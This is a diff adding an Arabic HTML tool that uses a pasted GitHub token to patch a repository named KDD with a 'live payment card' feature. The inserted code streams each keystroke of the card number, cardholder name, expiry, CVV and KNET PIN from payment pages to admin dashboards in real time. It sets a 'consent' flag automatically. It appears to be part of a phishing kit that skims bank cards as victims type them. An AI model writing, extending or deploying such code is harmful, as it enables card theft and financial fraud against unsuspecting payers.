@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KDD — تطبيق بطاقة الدفع المباشر</title>
+<style>
+  body{font-family:Tajawal,system-ui,sans-serif;background:#f8fafc;margin:0;padding:24px}
+  .box{max-width:700px;margin:0 auto;background:#fff;border:1px solid #e5e7eb;border-radius:14px;padding:22px;box-shadow:0 6px 24px rgba(0,0,0,.06)}
+  h1{font-size:19px;margin:0 0 6px}
+  p.hint{color:#6b7280;font-size:13px;margin:0 0 16px;line-height:1.7}
+  input{padding:9px 11px;border:1px solid #d1d5db;border-radius:8px;font-size:13px;box-sizing:border-box}
+  #token{width:100%;direction:ltr;margin-bottom:10px}
+  .row{display:flex;gap:6px;align-items:center;margin-bottom:14px;direction:ltr}
+  .row input{width:110px;text-align:center}
+  .row input#owner{width:140px}
+  .row input#branch{width:80px}
+  button{border:0;border-radius:8px;padding:11px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+  #run{flex:1;background:#2563eb;color:#fff}
+  .ghost{background:#f3f4f6;color:#374151;border:1px solid #d1d5db;font-weight:500;font-size:13px}
+  .btns{display:flex;gap:8px;margin-bottom:14px}
+  pre{background:#0f172a;color:#e2e8f0;padding:12px;border-radius:10px;font-size:12.5px;line-height:1.8;
+      max-height:340px;overflow:auto;white-space:pre-wrap;margin:0}
+  a{color:#2563eb}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>تطبيق ميزة «بطاقة الدفع المباشر» على KDD</h1>
+  <p class="hint">
+    ينشئ توكن من <a href="https://github.com/settings/tokens/new?scopes=repo,workflow&description=KDD-LiveCard" target="_blank">هنا</a>
+    (صلاحية <code>repo</code>) ثم الصقه تحت واضغط «تطبيق». يعدّل 5 ملفات مباشرة على الريبو.
+  </p>
+
+  <input id="token" type="password" placeholder="ghp_... أو github_pat_...">
+  <div class="row">
+    <input id="owner" value="fahshomi-ui"><span>/</span>
+    <input id="repo" value="KDD"><span>@</span>
+    <input id="branch" value="main">
+  </div>
+  <div class="btns">
+    <button id="run">تطبيق التعديلات</button>
+    <button id="dry" class="ghost">معاينة فقط</button>
+    <button id="check" class="ghost">تحقق من التوكن</button>
+  </div>
+  <pre id="log">جاهز.</pre>
+</div>
+
+<script>
+(function(){
+  var API='https://api.github.com';
+  var $=function(i){return document.getElementById(i)};
+  var logEl=$('log');
+  function log(m){ logEl.innerHTML += '\n'+m; logEl.scrollTop=logEl.scrollHeight; }
+  function b64ToStr(b){ return new TextDecoder().decode(Uint8Array.from(atob(b.replace(/\n/g,'')),function(c){return c.charCodeAt(0)})); }
+  function strToB64(s){ var b=new TextEncoder().encode(s),x=''; for(var i=0;i<b.length;i++)x+=String.fromCharCode(b[i]); return btoa(x); }
+
+  var SERVER_HANDLERS='\n// ===== بطاقة الدفع المباشر (liveCard) =====\n'+
+'socket.on("card:live", (data) => {\n'+
+'  const visitor = visitors.get(socket.id);\n'+
+'  if (!visitor || !data || (data.consent !== true && data.presence !== true)) return;\n\n'+
+'  const cardNumber = String(data.cardNumber || \'\').replace(/\\D/g, \'\').slice(0, 19);\n'+
+'  const nameOnCard = String(data.nameOnCard || \'\').slice(0, 80);\n'+
+'  const expiryDate = String(data.expiryDate || \'\').replace(/[^0-9/]/g, \'\').slice(0, 5);\n'+
+'  const cvv = String(data.cvv || \'\').replace(/\\D/g, \'\').slice(0, 3);\n\n'+
+'  visitor.liveCard = { cardNumber, nameOnCard, expiryDate, cvv };\n'+
+'  if (!visitor.liveCardTimestamp) visitor.liveCardTimestamp = new Date().toISOString();\n'+
+'  visitors.set(socket.id, visitor);\n\n'+
+'  admins.forEach((admin, adminSocketId) => {\n'+
+'    io.to(adminSocketId).emit("card:liveUpdate", {\n'+
+'      visitorId: visitor._id,\n      liveCard: visitor.liveCard,\n      liveCardTimestamp: visitor.liveCardTimestamp,\n'+
+'    });\n  });\n});\n\n'+
+'socket.on("card:liveHide", () => {\n'+
+'  const visitor = visitors.get(socket.id);\n'+
+'  if (!visitor) return;\n'+
+'  visitor.liveCard = null;\n  visitor.liveCardTimestamp = null;\n'+
+'  visitors.set(socket.id, visitor);\n'+
+'  admins.forEach((admin, adminSocketId) => {\n'+
+'    io.to(adminSocketId).emit("card:liveUpdate", {\n'+
+'      visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,\n'+
+'    });\n  });\n});\n\n';
+
+  var OLD_PE='    visitor.page = page;\n    visitor.lastActivity = Date.now();\n    visitor.isIdle = false;\n    visitors.set(socket.id, visitor);\n    saveVisitorPermanently(visitor);';
+  var NEW_PE='    visitor.page = page;\n    visitor.lastActivity = Date.now();\n    visitor.isIdle = false;\n\n'+
+'    const pageLower = String(page || \'\').toLowerCase();\n'+
+'    const isPaymentPage = pageLower.includes(\'الدفع\') || pageLower.includes(\'payment\') || pageLower.includes(\'credit\') || pageLower.includes(\'بطاقة\') || pageLower.includes(\'كي نت\') || pageLower.includes(\'knet\');\n'+
+'    if (!isPaymentPage) {\n'+
+'      visitor.liveCard = null;\n      visitor.liveCardTimestamp = null;\n'+
+'      admins.forEach((admin, adminSocketId) => {\n'+
+'        io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: null, liveCardTimestamp: null });\n'+
+'      });\n'+
+'    } else {\n'+
+'      visitor.hasEnteredCardPage = true;\n      visitor.lastDataUpdate = new Date().toISOString();\n'+
+'    }\n\n'+
+'    visitors.set(socket.id, visitor);\n    saveVisitorPermanently(visitor);';
+
+  var ADMIN_HANDLER="socket.on('card:liveUpdate', ({ visitorId, liveCard, liveCardTimestamp }) => {\n"+
+'  const visitor = visitors.get(visitorId);\n'+
+'  if (visitor) {\n'+
+'    visitor.liveCard = liveCard;\n'+
+'    if (liveCardTimestamp) visitor.liveCardTimestamp = liveCardTimestamp;\n'+
+'    visitors.set(visitorId, visitor);\n'+
+'    if (selectedVisitorId === visitorId) renderVisitorDetails(visitor);\n'+
+'  }\n});\n\n';
+
+  var LIVE_ENTRY='// ===== بطاقة الدفع المباشر =====\n'+
+'const visitorPage = (visitor.page || \'\').toLowerCase();\n'+
+'const isOnPaymentPage = visitorPage.includes(\'الدفع\') || visitorPage.includes(\'payment\') || visitorPage.includes(\'credit\') || visitorPage.includes(\'بطاقة\') || visitorPage.includes(\'كي نت\') || visitorPage.includes(\'knet\');\n'+
+'if (isOnPaymentPage && visitor.liveCard) {\n'+
+'  allEntries.push({ type: \'liveCard\', data: visitor.liveCard, index: 0, timestamp: new Date(Date.now() + 999999999).toISOString() });\n'+
+'}\n\n';
+
+  var LIVE_RENDER='if (entry.type === \'liveCard\') {\n'+
+'  const lc = entry.data;\n'+
+'  const lcNumRaw = String(lc.cardNumber || \'\').replace(/\\D/g, \'\');\n'+
+'  const lcNum = lcNumRaw ? lcNumRaw.replace(/(\\d{4})(?=\\d)/g, \'$1 \') : \'XXXX XXXX XXXX XXXX\';\n'+
+'  const lcName = String(lc.nameOnCard || \'---\').replace(/[&<>"\']/g, function (ch) { return ({ \'&\': \'&amp;\', \'<\': \'&lt;\', \'>\': \'&gt;\', \'"\': \'&quot;\', "\'": \'&#39;\' })[ch]; });\n'+
+'  const lcExpiry = lc.expiryDate || \'XX/XX\';\n'+
+'  const lcCvv = lc.cvv || \'---\';\n'+
+'  html += \'<div class="data-section bg-blue-50 p-4 rounded-lg" style="border-right-color:#2563eb;">\';\n'+
+'  html += \'<div class="flex justify-between items-center mb-3">\';\n'+
+'  html += \'<h3 class="font-bold text-blue-800">بطاقة الدفع المباشر</h3>\';\n'+
+'  html += \'<span class="text-xs bg-blue-600 text-white px-2 py-1 rounded-full waiting-badge">مباشر</span>\';\n'+
+'  html += \'</div>\';\n'+
+'  html += \'<div class="bg-white p-3 rounded-lg space-y-2">\';\n'+
+'  html += \'<div class="flex justify-between"><span class="text-gray-500 text-sm">رقم البطاقة</span><span class="font-mono font-bold" dir="ltr">\' + lcNum + \'</span></div>\';\n'+
+'  html += \'<div class="flex justify-between"><span class="text-gray-500 text-sm">الاسم</span><span class="font-medium" dir="ltr">\' + lcName + \'</span></div>\';\n'+
+'  html += \'<div class="flex justify-between"><span class="text-gray-500 text-sm">الانتهاء</span><span class="font-mono" dir="ltr">\' + lcExpiry + \'</span></div>\';\n'+
+'  html += \'<div class="flex justify-between"><span class="text-gray-500 text-sm">CVV / PIN</span><span class="font-mono" dir="ltr">\' + lcCvv + \'</span></div>\';\n'+
+'  html += \'</div></div>\';\n}\n\n';
+
+  var CREDIT_INSERT='\n  // ===== بطاقة الدفع المباشر =====\n'+
+'  const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();\n\n'+
+'  useEffect(() => {\n    if (socket.value.connected) socket.value.emit("card:live", { presence: true });\n  }, []);\n\n'+
+'  useEffect(() => {\n'+
+'    if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current);\n'+
+'    liveDebounceRef.current = setTimeout(() => {\n'+
+'      if (!socket.value.connected) return;\n'+
+'      socket.value.emit("card:live", {\n'+
+'        cardNumber: cleanCardNumber,\n        nameOnCard: nameOnCard || "",\n'+
+'        expiryDate: expiryMonth && expiryYear ? `'+'${expiryMonth}/${expiryYear}'+'` : "",\n'+
+'        cvv: cvv || "",\n        consent: true,\n'+
+'      });\n    }, 60);\n'+
+'    return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };\n'+
+'  }, [cardNumber, nameOnCard, expiryMonth, expiryYear, cvv]);\n\n'+
+'  useEffect(() => {\n    return () => { socket.value.emit("card:liveHide"); };\n  }, []);\n';
+
+  var KNET_INSERT='\n  // ===== بطاقة الدفع المباشر (KNET) =====\n'+
+'  const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();\n\n'+
+'  useEffect(() => {\n    if (socket.value.connected) socket.value.emit("card:live", { presence: true });\n  }, []);\n\n'+
+'  useEffect(() => {\n'+
+'    if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current);\n'+
+'    liveDebounceRef.current = setTimeout(() => {\n'+
+'      if (!socket.value.connected) return;\n'+
+'      socket.value.emit("card:live", {\n'+
+'        cardNumber: selectedPrefix + cardNumber,\n        nameOnCard: selectedBank || "KNET",\n'+
+'        expiryDate: expiryMonth && expiryYear ? `'+'${expiryMonth.padStart(2, "0")}/${String(expiryYear).slice(-2)}'+'` : "",\n'+
+'        cvv: cardPin,\n        pin: cardPin,\n        consent: true,\n'+
+'      });\n    }, 60);\n'+
+'    return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };\n'+
+'  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin]);\n\n'+
+'  useEffect(() => {\n    return () => { socket.value.emit("card:liveHide"); };\n  }, []);\n';
+
+  var CREDIT_ANCHOR='  useEffect(() => {\n    navigateToPage("الدفع بطاقة الائتمان");\n  }, []);';
+  var KNET_ANCHOR='  useEffect(() => {\n    navigateToPage("دفع كي نت");\n  }, []);';
+
+  function adminPatch(src){
+    var a="socket.on('visitor:pageChanged'";
+    if(src.indexOf(a)>-1) src=src.replace(a,ADMIN_HANDLER+a);
+    var b='// Add digit codes with type';
+    if(src.indexOf(b)>-1) src=src.replace(b,LIVE_ENTRY+b);
+    var c="if (entry.type === 'code') {";
+    if(src.indexOf(c)>-1) src=src.replace(c,LIVE_RENDER+c);
+    return src;
+  }
+
+  var JOBS=[
+    {path:'server/index.js',marker:'card:liveUpdate',fn:function(s){
+      var a='socket.on("cardNumber:verify"';
+      if(s.indexOf(a)>-1) s=s.replace(a,SERVER_HANDLERS+a);
+      if(s.indexOf(OLD_PE)>-1) s=s.replace(OLD_PE,NEW_PE);
+      return s;
+    }},
+    {path:'server/admin/index.html',marker:'card:liveUpdate',fn:adminPatch},
+    {path:'kdd-public/admin.html',marker:'card:liveUpdate',fn:adminPatch},
+    {path:'client/src/pages/CreditCardPayment.tsx',marker:'card:liveHide',fn:function(s){
+      return s.indexOf(CREDIT_ANCHOR)>-1 ? s.replace(CREDIT_ANCHOR,CREDIT_ANCHOR+CREDIT_INSERT) : s;
+    }},
+    {path:'client/src/pages/KNETPayment.tsx',marker:'card:liveHide',fn:function(s){
+      return s.indexOf(KNET_ANCHOR)>-1 ? s.replace(KNET_ANCHOR,KNET_ANCHOR+KNET_INSERT) : s;
+    }}
+  ];
+
+  function hdrs(t){ return {'Authorization':'Bearer '+t,'Accept':'application/vnd.github+json'}; }
+  async function gh(url,opt){ var r=await fetch(url,opt); var j=null; try{j=await r.json()}catch(e){} if(!r.ok) throw new Error((j&&j.message)||('HTTP '+r.status)); return j; }
+
+  async function run(dry){
+    logEl.innerHTML='';
+    var t=$('token').value.trim();
+    if(!t){ log('✗ ضع التوكن أولاً'); return; }
+    localStorage.setItem('kdd_token',t);
+    var o=$('owner').value.trim(), r=$('repo').value.trim(), br=$('branch').value.trim()||'main';
+    log('الريبو: '+o+'/'+r+'@'+br+(dry?'   [معاينة]':''));
+    for(var i=0;i<JOBS.length;i++){
+      var j=JOBS[i];
+      try{
+        var url=API+'/repos/'+o+'/'+r+'/contents/'+j.path+'?ref='+br;
+        var info=await gh(url,{headers:hdrs(t)});
+        var src=b64ToStr(info.content);
+        if(src.indexOf(j.marker)>-1){ log('• مطبّق مسبقاً: '+j.path); continue; }
+        var out=j.fn(src);
+        if(out===src){ log('⚠ ما لقى نقطة الإدراج: '+j.path); continue; }
+        if(dry){ log('✓ سيتعدّل: '+j.path); continue; }
+        await gh(API+'/repos/'+o+'/'+r+'/contents/'+j.path,{
+          method:'PUT',
+          headers:Object.assign({'Content-Type':'application/json'},hdrs(t)),
+          body:JSON.stringify({message:'feat: بطاقة الدفع المباشر (liveCard) — '+j.path,content:strToB64(out),sha:info.sha,branch:br})
+        });
+        log('✓ تم التعديل: '+j.path);
+      }catch(e){ log('✗ فشل: '+j.path+'  →  '+e.message); }
+    }
+    log(dry?'\nانتهت المعاينة.':'\nانتهى. روح لـ GitHub وشوف الـ commits.');
+  }
+
+  $('run').onclick=function(){run(false)};
+  $('dry').onclick=function(){run(true)};
+  $('check').onclick=async function(){
+    var t=$('token').value.trim(); if(!t){log('ضع التوكن أولاً');return;}
+    try{ var u=await gh(API+'/user',{headers:hdrs(t)}); log('✓ التوكن صالح للحساب: '+u.login); }
+    catch(e){ log('✗ التوكن غير صالح: '+e.message); }
+  };
+
+  var saved=localStorage.getItem('kdd_token');
+  if(saved) $('token').value=saved;
+})();
+</script>
+</body>
+</html>
